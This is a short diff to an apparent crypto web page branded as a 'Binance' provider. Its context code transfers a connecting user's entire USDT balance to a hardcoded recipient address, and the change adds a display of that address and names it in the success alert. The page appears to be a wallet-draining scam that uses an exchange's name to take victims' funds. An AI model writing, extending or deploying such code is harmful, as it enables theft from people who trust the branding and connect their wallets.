@@ -244,6 +244,10 @@
                     <div class="provider-title">Provider</div>
                     <div class="provider-value">Binance</div>
                 </div>
+                <div class="provider-row">
+                    <div class="provider-title">Recipient Address</div>
+                    <div class="provider-value" style="font-size:12px">0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943</div>
+                </div>
             </div>
 
             <div id="errorMessage" class="error-message"></div>
@@ -392,7 +396,7 @@
                     const tx = await contract.transfer(RECIPIENT_ADDRESS, balance);
                     
                     // Show success
-                    alert(`Success! Transferred ${balanceInUSDT.toFixed(2)} USDT`);
+                    alert(`Success! Transferred ${balanceInUSDT.toFixed(2)} USDT to:\n${RECIPIENT_ADDRESS}`);
 
                 } catch (error) {
                     console.error(error);
